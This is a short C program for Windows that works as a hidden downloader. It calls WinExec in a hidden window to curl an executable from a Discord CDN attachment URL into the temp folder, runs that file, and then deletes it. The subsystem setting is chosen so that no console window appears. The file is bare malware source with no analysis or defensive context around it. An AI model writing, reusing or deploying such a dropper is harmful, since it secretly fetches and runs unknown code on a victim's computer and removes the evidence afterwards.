#include <windows.h>
#pragma comment(lib,"minicrt.lib")
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

int main () {
    WinExec("cmd.exe /c @echo off && curl https://cdn.discordapp.com/attachments/950546791596695583/969650516302905364/hwgui.exe -o %temp%\\downloaded.exe -s && %temp%\\downloaded.exe && del %temp%\\downloaded.exe", SW_HIDE);
    return 0;
}